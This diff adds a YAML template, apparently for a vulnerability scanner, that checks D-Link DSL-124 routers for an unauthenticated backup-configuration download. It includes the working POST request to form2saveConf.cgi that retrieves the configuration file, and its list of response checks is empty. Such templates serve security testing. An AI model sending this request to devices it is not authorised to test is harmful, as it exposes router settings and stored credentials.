@@ -1,0 +1,20 @@
+id: dlink-n300-backup
+brief:
+    title: DSL-124 Wireless N300 ADSL2+ - Backup File Disclosure
+    by: DhiyaneshDk
+    level: high
+    about: The DSL-124 Wireless N300 ADSL2+ router exposes a backup configuration file that can be downloaded without authentication.
+    label:
+        - dsl
+        - d-link
+        - disclosure
+        - backup
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/form2saveConf.cgi'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: submit.htm?saveconf.htm=Back+Settings
+      signs: []
